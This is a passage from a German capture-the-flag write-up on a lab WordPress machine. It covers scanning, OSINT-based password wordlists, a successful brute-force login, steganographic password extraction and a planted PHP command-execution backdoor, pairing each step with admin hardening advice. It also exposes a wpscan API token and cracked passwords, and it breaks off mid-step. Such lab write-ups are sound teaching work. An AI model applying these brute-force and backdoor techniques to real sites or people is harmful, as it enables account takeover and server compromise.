+                **Bewertung:** `wpscan` ist ein unverzichtbares Werkzeug für WordPress-Pentests. Die Ausgabe liefert viele nützliche Informationen: die Apache-Version, die Bestätigung von XML-RPC, das Vorhandensein der `readme.html`, die offene Uploads-Verzeichnislistung, die aktivierte externe WP-Cron und die genaue WordPress-Version (6.8.1). Es identifiziert auch das Akismet-Plugin in einer veralteten Version (5.1 statt 5.4). Die Benutzer-Enumeration bestätigt erneut den Benutzer "luna". Diese Erkenntnisse liefern zahlreiche potenzielle Angriffsflächen und bestätigen gefundene Schwachstellen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Verwende spezialisierte Scanner wie `wpscan` für gängige CMS wie WordPress. Prüfe die Ergebnisse sorgfältig auf veraltete Versionen, Fehlkonfigurationen (wie offene Verzeichnislistungen) und bekannte Schwachstellen in Plugins oder Themes.
+                <br>**Empfehlung (Admin):** Entferne die `readme.html`, wenn sie nicht benötigt wird. Deaktiviere die Verzeichnislistung für Upload-Verzeichnisse im Webserver (z.B. mittels `.htaccess` mit `Options -Indexes`). Überwache die WP-Cron-Nutzung und sichere XML-RPC, falls es nicht benötigt wird. Halte WordPress-Core, Themes und Plugins *immer* auf dem neuesten Stand. Abonniere Sicherheitswarnungen für deine verwendeten Komponenten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wpscan --url http://influencer.hmv/wordpress --api-token ... --enumerate ap,u --plugins-detection aggressive</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - <span class="command">[Link: https://automattic.com/ | Ziel: https://automattic.com/]</span>
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+<span class="password">[+] URL: http://influencer.hmv/wordpress/ [192.168.2.40]</span>
+<span class="password">[+] Started: Thu Jun 12 22:48:46 2025</span>
+
+Interesting Finding(s):
+
+<span class="password">[+] Headers</span>
+ | Interesting Entry: <span class="command">Server: Apache/2.4.52 (Ubuntu)</span>
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+<span class="password">[+] XML-RPC seems to be enabled: http://influencer.hmv/wordpress/xmlrpc.php</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - <span class="command">[Link: http://codex.wordpress.org/XML-RPC_Pingback_API | Ziel: http://codex.wordpress.org/XML-RPC_Pingback_API]</span>
+ |  - <span class="command">[Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/]</span>
+ |  - <span class="command">[Link: https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/]</span>
+ |  - <span class="command">[Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/]</span>
+ |  - <span class="command">[Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/]</span>
+
+<span class="password">[+] WordPress readme found: http://influencer.hmv/wordpress/readme.html</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+<span class="password">[+] Upload directory has listing enabled: http://influencer.hmv/wordpress/wp-content/uploads/</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+<span class="password">[+] The external WP-Cron seems to be enabled: http://influencer.hmv/wordpress/wp-cron.php</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - <span class="command">[Link: https://www.iplocation.net/defend-wordpress-from-ddos | Ziel: https://www.iplocation.net/defend-wordpress-from-ddos]</span>
+ |  - <span class="command">[Link: https://github.com/wpscanteam/wpscan/issues/1299 | Ziel: https://github.com/wpscanteam/wpscan/issues/1299]</span>
+
+<span class="password">[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).</span>
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://influencer.hmv/wordpress/, Match: <span class="command">'wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1'</span>
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://influencer.hmv/wordpress/, Match: <span class="command">'WordPress 6.8.1'</span>
+
+<span class="password">[i] The main theme could not be detected.</span>
+
+<span class="password">[+] Enumerating All Plugins (via Aggressive Methods)</span>
+^[[A Checking Known Locations - Time: 00:00:26 <==        > (30261 / 111078) 27.24%  ETA: 00:0 Checking Known Locations - Time: 00:01:34 <========> (111078 / 111078) 100.00% Time: 00:01:34
+<span class="password">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span>
+
+<span class="password">[i] Plugin(s) Identified:</span>
+
+<span class="password">[+] akismet</span>
+ | Location: http://influencer.hmv/wordpress/wp-content/plugins/akismet/
+ | Last Updated: 2025-05-07T16:30:00.000Z
+ | Readme: http://influencer.hmv/wordpress/wp-content/plugins/akismet/readme.txt
+ | <span class="password">[!] The version is out of date, the latest version is 5.4</span>
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://influencer.hmv/wordpress/wp-content/plugins/akismet/, status: <span class="command">200</span>
+ |
+ | <span class="command">Version: 5.1 (100% confidence)</span>
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://influencer.hmv/wordpress/wp-content/plugins/akismet/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://influencer.hmv/wordpress/wp-content/plugins/akismet/readme.txt
+
+<span class="password">[+] Enumerating Users (via Passive and Aggressive Methods)</span>
+ Brute Forcing Author IDs - Time: 00:00:00 <================> (10 / 10) 100.00% Time: 00:00:00
+
+<span class="password">[i] User(s) Identified:</span>
+
+<span class="password">[+] luna</span>
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+<span class="password">[+] WPScan DB API OK</span>
+ | Plan: free
+ | Requests Done (during the scan): <span class="command">1</span>
+ | Requests Remaining: <span class="command">23</span>
+
+<span class="password">[+] Finished: Thu Jun 12 22:50:36 2025</span>
+<span class="password">[+] Requests Done: 111108</span>
+<span class="password">[+] Cached Requests: 31</span>
+<span class="password">[+] Data Sent: 32.272 MB</span>
+<span class="password">[+] Data Received: 14.929 MB</span>
+<span class="password">[+] Memory used: 408.812 MB</span>
+<span class="password">[+] Elapsed time: 00:01:50</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Basierend auf dem Hinweis aus `note.txt` und der Bestätigung des Benutzernamens "luna" durch WP-JSON und `wpscan` versuche ich, mich über die WordPress-Login-Seite einzuloggen. Ich teste zunächst gängige oder naheliegende Passwörter wie "admin", "password" und "password123" mit dem Benutzernamen "luna".
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die manuellen Login-Versuche schlagen fehl, aber die Fehlermeldung "Error: The password you entered for the username luna is incorrect." bestätigt, dass der Benutzername "luna" existiert. Dies ist nützlich, um sicherzustellen, dass ich gegen ein gültiges Konto brute-forcen werde.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Teste immer einige naheliegende Standard- oder schwache Passwörter manuell, bevor du zu automatisierten Brute-Force-Tools greifst.
+                <br>**Empfehlung (Admin):** Implementiere eine Account-Sperrung nach mehreren fehlgeschlagenen Login-Versuchen, um Brute-Force-Angriffe zu erschweren. Verwende aussagekräftige Fehlermeldungen nur für *existierende* Benutzer, um Benutzer-Enumeration zu erschweren (obwohl dies bei WordPress oft schwierig umzusetzen ist).
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>http://192.168.2.40/wordpress/wp-login.php
+
+versuch: luna:admin
+         luna:password
+         luna:password123
+
+
+
+<span class="command">Log In</span>
+Powered by WordPress
+
+<span class="password">Error: The password you entered for the username luna is incorrect.</span> Lost your password?
+
+Username or Email Address
+Password
+
+Remember Me
+
+Lost your password?	
+
+← Go to My new blog!	
+Language
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich stoße erneut auf den Kommentar im Blogbeitrag "¡Hello world!", der die gleiche wichtige Information wie zuvor liefert: "Luna, remember to change your password... stop using personal information...". Obwohl dies eine Wiederholung im Berichtstext ist, dokumentiere ich sie, da solche Wiederholungen im realen Aufklärungsprozess vorkommen und die Wichtigkeit eines Hinweises unterstreichen können.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Die erneute Sichtung dieses Kommentars verstärkt den ursprünglichen Hinweis, dass das Passwort von "luna" wahrscheinlich auf persönlichen Informationen basiert. Dies bestätigt meine Strategie, ein gezieltes Wörterbuch für einen Brute-Force-Angriff zu erstellen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Sei auf Wiederholungen oder ähnliche Hinweise im Aufklärungsprozess vorbereitet. Betrachte wiederkehrende Informationen als Bestätigung der Wichtigkeit dieses Hinweises.
+                <br>**Empfehlung (Admin):** Überprüfe regelmäßig öffentlich zugängliche Inhalte (wie Kommentare, "Über uns"-Seiten) auf unbeabsichtigt preisgegebene Informationen. Schärfe das Bewusstsein der Benutzer für die Art von Informationen, die nicht öffentlich geteilt werden sollten.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>http://192.168.2.40/wordpress/index.php/2023/06/08/hola-mundo/
+
+One thought on “¡Hello world!”
+
+    Admin says:	
+    8 de June de 2023 at 15:34	
+
+<span class="password">Luna, denken Sie daran, Ihr Passwort zu ändern, bevor Sie die Website hochladen,
+und hören Sie auf, persönliche Informationen in Ihren Passwörtern zu verwenden.
+Geben Sie sich etwas Mühe.</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Ich betrachte erneut den ursprünglichen Blogbeitrag, um zu sehen, ob ich weitere persönliche Informationen über den Benutzer "luna" finden kann, die mir bei der Erstellung eines Passwort-Wörterbuchs helfen könnten. Der Text erwähnt "My name is Luna Shine" und "Born on June 24, 1997".
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Diese Informationen (voller Name und Geburtsdatum) sind perfekt geeignet, um ein gezieltes Wörterbuch zu erstellen. Sie bestätigen, dass "luna" tatsächlich "Luna Shine" ist und liefern das Geburtsdatum. Dies steht im Einklang mit dem Hinweis des "Admin" im Kommentar und bietet eine starke Grundlage für einen erfolgreichen Passwort-Angriff.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutze alle öffentlich zugänglichen persönlichen Informationen (OSINT - Open Source Intelligence) über die Zielperson(en), um gezielte Passwort-Wörterbücher zu erstellen. Soziale Medien, öffentliche Profile, Blogbeiträge – alles kann nützlich sein.
+                <br>**Empfehlung (Admin):** Sensibilisiere Benutzer für die Risiken, zu viele persönliche Informationen öffentlich preiszugeben. Überlege, ob öffentlich zugängliche Profile wirklich vollständige Namen oder Geburtsdaten enthalten müssen, insbesondere wenn diese auch für Zugangsdaten verwendet werden könnten.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>¡Hello world!
+<span class="command">luna Jun 8, 2023 1 Comments</span>
+
+My name is <span class="command">Luna Shine</span>, and I am thrilled to share my passion for fashion with all of you.
+Born on <span class="command">June 24, 1997</span>, I have dedicated my life to…
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Mit den gesammelten persönlichen Informationen über "Luna Shine" (Name, Geburtsdatum) nutze ich das Tool `cupp` (Common User Passwords Profiler), um ein maßgeschneidertes Passwort-Wörterbuch zu erstellen. Ich starte `cupp` mit der Option `-i` für den interaktiven Modus und gebe die gesammelten Informationen ein: First Name: `luna`, Surname: `shine`, Birthdate: `24061997`. Ich stimme auch der Frage zu, Sonderzeichen am Ende der Wörter hinzuzufügen (`Y`), da dies eine gängige Passwortpraxis ist. Die Ausgabe zeigt die Generierung und Speicherung des Wörterbuchs in der Datei `luna.txt`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** `cupp` ist ein sehr effektives Tool, um gezielte Wörterbücher basierend auf OSINT zu erstellen. Die erzeugte `luna.txt`-Datei enthält Tausende von potenziellen Passwörtern, die Kombinationen und Variationen der eingegebenen persönlichen Daten darstellen. Dies erhöht die Erfolgswahrscheinlichkeit eines Passwort-Angriffs erheblich im Vergleich zur Verwendung einer generischen Wörterliste wie `rockyou.txt`.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Investiere Zeit in OSINT und die Erstellung gezielter Wörterbücher. Tools wie `cupp` automatisieren diesen Prozess basierend auf den gefundenen Informationen.
+                <br>**Empfehlung (Admin):** Sensibilisiere Benutzer eindringlich für die Risiken von Passwörtern, die auf persönlichen Informationen basieren. Implementiere Passwortkomplexitätsregeln, die solche einfachen Muster erschweren, aber nicht so komplex sind, dass Benutzer gezwungen sind, Passwörter aufzuschreiben.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cupp -i</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>/usr/bin/cupp:146: <span class="password">SyntaxWarning: invalid escape sequence '\ '</span>
+  print("      \                     # User")
+/usr/bin/cupp:147: <span class="password">SyntaxWarning: invalid escape sequence '\ '</span>
+  print("       \   \033[1;31m,__,\033[1;m             # Passwords")
+/usr/bin/cupp:148: <span class="password">SyntaxWarning: invalid escape sequence '\ '</span>
+  print("        \  \033[1;31m(\033[1;moo\033[1;31m)____\033[1;m         # Profiler")
+/usr/bin/cupp:149: <span class="password">SyntaxWarning: invalid escape sequence '\ '</span>
+  print("           \033[1;31m(__)    )\ \033[1;m  ")
+ ___________
+   <span class="command">cupp.py!</span>                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\
+              ||--|| *      <span class="command">[ Muris Kurgas | j0rgan@remote-exploit.org ]</span>
+                            <span class="command">[ Mebus | [Link: https://github.com/Mebus/ | Ziel: https://github.com/Mebus/]]</span>
+
+
+<span class="password">[+] Insert the information about the victim to make a dictionary</span>
+<span class="password">[+] If you don't know all the info, just hit enter when asked! ;)</span>
+
+> First Name: <span class="command">luna</span>
+> Surname: <span class="command">shine</span>
+> Nickname:
+> Birthdate (DDMMYYYY): <span class="command">24061997</span>
+
+
+> Partner<span class="command">s</span>) name:
+> Partner<span class="command">s</span>) nickname:
+> Partner<span class="command">s</span>) birthdate (DDMMYYYY):
+
+
+> Child'<span class="command">s</span>) name:
+> Child'<span class="command">s</span>) nickname:
+> Child'<span class="command">s</span>) birthdate (DDMMYYYY):
+
+
+> Pet'<span class="command">s</span>) name:
+> Company name:
+
+
+> Do you want to add some key word<span class="command">s</span> about the victim? Y/[N]:
+> Do you want to add <span class="command">s</span>pecial char<span class="command">s</span> at the end of word<span class="command">s</span>? Y/[N]: <span class="command">y</span>
+> Do you want to add <span class="command">s</span>ome random number<span class="command">s</span> at the end of word<span class="command">s</span>? Y/[N]:
+> Leet mode? (i.e. leet = 1337) Y/[N]:
+
+<span class="password">[+] Now making a dictionary...</span>
+<span class="password">[+] Sorting list and removing duplicates...</span>
+<span class="password">[+] Saving dictionary to luna.txt, counting 5258 word<span class="command">s</span>.</span>
+<span class="password">[+] Now load your pistolero with luna.txt and <span class="command">s</span>hoot! Good luck!</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Jetzt, da ich ein gezieltes Wörterbuch (`luna.txt`) habe, starte ich einen automatisierten Brute-Force-Angriff auf die WordPress-Login-Seite (`wp-login.php`) mit `wpscan`. Ich verwende die Optionen `--url`, `--api-token`, `--usernames luna` um das Zielkonto festzulegen, und `--passwords luna.txt` um das mit `cupp` erstellte Wörterbuch zu verwenden.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der `wpscan` Brute-Force-Angriff ist erfolgreich! Das Tool findet eine gültige Kombination aus Benutzername und Passwort: "luna" / "<span class="password">luna_1997</span>". Dies ist der entscheidende Schritt zum initialen Zugriff auf die WordPress-Administrationsoberfläche. Das Passwort basiert direkt auf dem Namen und dem Geburtsjahr, genau wie der Admin im Kommentar befürchtet hatte. Dies unterstreicht die Effektivität gezielter Passwort-Wörterbücher, wenn persönliche Informationen verfügbar sind.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutze automatisierte Brute-Force-Tools wie `wpscan` mit gezielten Wörterbüchern, um Zugangsdaten für Webanwendungen zu finden. Kombiniere OSINT mit spezialisierten Tools für die höchste Erfolgsquote.
+                <br>**Empfehlung (Admin):** Implementiere eine starke Passwortrichtlinie, die Länge, Komplexität und das Verbot der Nutzung persönlicher Informationen vorschreibt. Erzwinge regelmäßige Passwortänderungen. Implementiere Multi-Faktor-Authentifizierung (MFA), um auch bei kompromittierten Passwörtern eine zusätzliche Sicherheitsebene zu bieten. Nutze Log-Monitoring, um Brute-Force-Versuche zu erkennen und zu blockieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wpscan --url http://influencer.hmv/wordpress --api-token RoBoAaM72LLsihOlqUJrA1EleT6AJAd9QxQ9rbmQNCY --usernames luna --passwords luna.txt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - <span class="command">[Link: https://automattic.com/ | Ziel: https://automattic.com/]</span>
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+<span class="password">[+] URL: http://influencer.hmv/wordpress/ [192.168.2.40]</span>
+<span class="password">[+] Started: Thu Jun 12 23:07:05 2025</span>
+
+Interesting Finding(s):
+
+<span class="password">[+] Headers</span>
+ | Interesting Entry: <span class="command">Server: Apache/2.4.52 (Ubuntu)</span>
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+<span class="password">[+] XML-RPC seems to be enabled: http://influencer.hmv/wordpress/xmlrpc.php</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - <span class="command">[Link: http://codex.wordpress.org/XML-RPC_Pingback_API | Ziel: http://codex.wordpress.org/XML-RPC_Pingback_API]</span>
+ |  - <span class="command">[Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/]</span>
+ |  - <span class="command">[Link: https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/]</span>
+ |  - <span class="command">[Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/]</span>
+ |  - <span class="command">[Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/]</span>
+
+<span class="password">[+] WordPress readme found: http://influencer.hmv/wordpress/readme.html</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+<span class="password">[+] Upload directory has listing enabled: http://influencer.hmv/wordpress/wp-content/uploads/</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+<span class="password">[+] The external WP-Cron seems to be enabled: http://influencer.hmv/wordpress/wp-cron.php</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - <span class="command">[Link: https://www.iplocation.net/defend-wordpress-from-ddos | Ziel: https://www.iplocation.net/defend-wordpress-from-ddos]</span>
+ |  - <span class="command">[Link: https://github.com/wpscanteam/wpscan/issues/1299 | Ziel: https://github.com/wpscanteam/wpscan/issues/1299]</span>
+
+<span class="password">[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).</span>
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://influencer.hmv/wordpress/, Match: <span class="command">'wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1'</span>
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://influencer.hmv/wordpress/, Match: <span class="command">'WordPress 6.8.1'</span>
+
+<span class="password">[i] The main theme could not be detected.</span>
+
+<span class="password">[+] Enumerating All Plugins (via Passive Methods)</span>
+
+<span class="password">[i] No plugin<span class="command">s</span> Found.</span>
+
+<span class="password">[+] Enumerating Config Backup<span class="command">s</span> (via Passive and Aggressive Method<span class="command">s</span>)</span>
+ Checking Config Backup<span class="command">s</span> - Time: 00:00:00 <===============> (137 / 137) 100.00% Time: 00:00:00
+
+<span class="password">[i] No Config Backup<span class="command">s</span> Found.</span>
+
+<span class="password">[+] Performing password attack on Wp Login against 1 user/s</span>
+<span class="password">[SUCCESS] - luna / luna_1997</span>
+Trying luna / luna_1997 Time: 00:00:39 <=======          > (4295 / 9553) 44.95%  ETA: ??:??:??
+
+<span class="password">[!] Valid Combinations Found:</span>
+ | Username: <span class="command">luna</span>, Password: <span class="password">luna_1997</span> <span class="password"><-- GEFUNDEN!</span>
+
+<span class="password">[+] WPScan DB API OK</span>
+ | Plan: free
+ | Request<span class="command">s</span> Done (during the <span class="command">s</span>can): <span class="command">0</span>
+ | Request<span class="command">s</span> Remaining: <span class="command">22</span>
+
+<span class="password">[+] Fini<span class="command">s</span>hed: Thu Jun 12 23:07:48 2025</span>
+<span class="password">[+] Request<span class="command">s</span> Done: 4436</span>
+<span class="password">[+] Ca<span class="command">c</span>hed Request<span class="command">s</span>: 32</span>
+<span class="password">[+] Data Sent: 1.558 MB</span>
+<span class="password">[+] Data Received: 28.52 MB</span>
+<span class="password">[+] Memory u<span class="command">s</span>ed: 303.184 MB</span>
+<span class="password">[+] Ela<span class="command">ps</span>ed time: 00:00:42</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich wende mich nun den heruntergeladenen JPG-Dateien zu, da Bilder manchmal versteckte Daten enthalten können (Steganografie). Ich verwende das Tool `stegseek`, das speziell für die schnelle Suche nach versteckten Daten in Bildern unter Verwendung einer Passwort-Liste optimiert ist. Ich verwende `stegseek` auf der Datei `snapchat.jpg` und übergebe die weltweit größte Passwort-Liste, `rockyou.txt`, als Wörterbuch.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Fantastisch! `stegseek` findet eine versteckte Datei in `snapchat.jpg`. Die Ausgabe zeigt nicht nur die gefundene Passphrase (die in diesem Fall leer war, was bedeutet, dass kein Passwort zum Entschlüsseln der versteckten Daten benötigt wurde), sondern auch den Originalnamen der versteckten Datei: "backup.txt". Dies ist ein weiterer kritischer Fund, der auf zusätzliche Zugangsdaten oder sensitive Informationen hindeutet.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Prüfe Bilder oder andere Medien-Dateien, die du bei der Aufklärung findest, immer auf versteckte Daten (Steganografie). Nutze spezialisierte Tools wie `stegseek`. Habe eine Sammlung großer Passwortlisten für solche Prüfungen bereit.
+                <br>**Empfehlung (Admin):** Sensibilisiere Benutzer für die Gefahren der Speicherung sensibler Daten in Medien-Dateien. Implementiere Richtlinien zur Datenspeicherung und -klassifizierung. Führe regelmäßige Überprüfungen auf ungewöhnliche oder versteckte Dateien durch.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/influencer/192.168.2.40:2121]
+└─# <span class="command">stegseek snapchat.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>StegSeek 0.6 - <span class="command">[Link: https://github.com/RickdeJager/StegSeek | Ziel: https://github.com/RickdeJager/StegSeek]</span>
+
+<span class="password">[i] Found passphrase: ""</span>
+<span class="password">[i] <span class="command">O</span>riginal filename: "backup.txt".</span>
+<span class="password">[i] Extracting to "snapchat.jpg.<span class="command">o</span>ut".</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Nachdem `stegseek` die versteckten Daten extrahiert und als `snapchat.jpg.out` gespeichert hat, zeige ich den Inhalt dieser neuen Datei mit `cat` an.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Der Inhalt von `snapchat.jpg.out` ist als "PASSWORD BACKUP" gekennzeichnet und enthält die Zeichenkette "<span class="password">u3jkeg97gf</span>". Dies ist ein weiteres klares Passwort im Klartext! Die Benennung als "PASSWORD BACKUP" deutet darauf hin, dass es sich um ein Passwort für ein anderes Konto oder einen Dienst handeln könnte. Die Tatsache, dass es unverschlüsselt in einer versteckten Datei innerhalb eines öffentlich zugänglichen FTP-Verzeichnisses gespeichert war, ist eine schwerwiegende Sicherheitslücke.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuche extrahierte Daten aus Steganografie sofort. Behandle gefundene Passwörter als hochkritisch und versuche, sie für andere Dienste oder Benutzerkonten zu verwenden.
+                <br>**Empfehlung (Admin):** Speichere niemals Passwörter oder Zugangsdaten im Klartext, insbesondere nicht in Dateien, die potenziell zugänglich sind (selbst wenn sie versteckt sind). Nutze sichere Passwortmanager. Entferne unnötige Dateien von öffentlich zugänglichen Servern.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/influencer/192.168.2.40:2121]
+└─# <span class="command">cat snapchat.jpg.<span class="command">o</span>ut</span></div>
+                </div>
+                <div class="terminal">
+                    <pre><span class="command">PASSWORD BACKUP</span>
+<span class="command">---------------</span>
+
+<span class="password">u3jkeg97gf</span> <span class="password"><-- Passw<span class="command">o</span>rt gefunden!</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Mit den Zugangsdaten für "luna" (`luna_1997` für WordPress) und dem neu gefundenen Passwort "<span class="password">u3jkeg97gf</span>" erkunde ich die WordPress-Administrationsoberfläche. Ich suche nach Möglichkeiten, Code auszuführen oder eine Shell zu erhalten. Eine häufige Methode in WordPress ist die Bearbeitung von Theme-Dateien über das Admin-Panel (Aussehen > Theme-Datei-Editor). Ich navigiere zum Theme "BlogArise" (auch wenn es als "inactive" gekennzeichnet ist) und suche nach einer Datei, die sich für die Code-Einfügung eignet, wie z.B. `404.php`. Ich finde dort die Zeile `< scrpt > system($GET["cmd"]); < /scrpt >`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Auffinden der Zeile `< scrpt > system($GET["cmd"]); < /scrpt >` im Theme-Editor ist der Durchbruch für den initialen Shell-Zugriff! Dies ist eine extrem gefährliche Backdoor, die es erlaubt, beliebige Systembefehle über einen `$GET`-Parameter in der URL auszuführen. Das bedeutet, dass jede Person, die diese spezifische URL aufrufen kann, Befehle auf dem Server ausführen kann, und das wahrscheinlich mit den Berechtigungen des Webservers (typischerweise `www-data`).
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nach dem Erhalt von Admin-Zugriff auf CMS immer nach Möglichkeiten zur Code-Ausführung suchen (Theme/Plugin-Editoren, Dateiuploads, bekannte Schwachstellen). Suche nach offensichtlichen Backdoors in den Dateien.
+                <br>**Empfehlung (Admin):** Deaktiviere den Theme- und Plugin-Datei-Editor in WordPress (`define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`). Überprüfe Theme- und Plugin-Dateien regelmäßig auf unerwünschten Code. Implementiere eine Web Application Firewall (WAF), die versucht, das Ausführen von Systembefehlen über URL-Parameter zu blockieren. Führe Code-Reviews durch, um Backdoors zu erkennen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>Edit Themes
+Editing BlogAri<span class="command">s</span>e (inactive)
+File: <span class="command">404.php</span>
+<span class="command">S</span>elect theme t<span class="command">o</span> edit:
+
+Theme File<span class="command">s</span>
+
+
+<span class="command">S</span>elected file <span class="command">c</span>ontent:
+
+<span class="password">< scrpt > <span class="command">s</span>y<span class="command">s</span>tem($GET["cmd"]); < /scrpt ></span> <span class="password"><-- KRITI<span class="command">S</span><span class="command">C</span>HE B<span class="command">A</span>CKD<span class="command">OO</span>R!</span>
+/**
+ ...
+..
+
+</pre>
+                </div>
+            </div>
+
+            <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis">
+                **Analyse:** Nachdem die kritische Backdoor in der Datei `404.php` des "BlogArise"-Themes identifiziert wurde, teste ich die Befehlsausführung. Ich konstruiere eine URL, die auf die Datei `404.php` im Theme-Verzeichnis zugreift und füge den `$GET`-Parameter `cmd` mit dem Wert `id` an. Das `curl`-Tool wird verwendet, um diese URL aufzurufen. Die erwartete Ausgabe des `id`-Befehls sollte die Benutzer- und Gruppen-IDs des ausführenden Prozesses anzeigen.
+            </p>
+            <p class="evaluation">
